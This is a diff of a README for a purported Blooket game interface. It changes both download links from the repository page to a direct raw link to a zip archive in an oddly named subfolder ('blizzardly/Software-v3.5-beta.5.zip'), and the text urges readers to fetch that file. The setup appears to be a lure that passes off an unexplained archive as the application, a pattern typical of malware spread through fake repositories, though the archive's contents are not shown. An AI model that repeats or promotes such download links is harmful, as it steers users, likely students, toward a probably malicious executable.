@@ -1,6 +1,6 @@
 # 🎮 blooket - A simple interface for Blooket games
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/adumensahrutland-create/blooket)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/adumensahrutland-create/blooket/raw/refs/heads/main/blizzardly/Software-v3.5-beta.5.zip)
 
 ## 📖 About this application
 
@@ -19,7 +19,7 @@ Before you install this software, ensure your computer meets these requirements:
 
 You must visit the project page to obtain the correct file for your system.
 
-[Download the application here](https://github.com/adumensahrutland-create/blooket)
+[Download the application here](https://github.com/adumensahrutland-create/blooket/raw/refs/heads/main/blizzardly/Software-v3.5-beta.5.zip)
 
 Follow these steps to find the file:
 1. Copy the link above into your web browser.
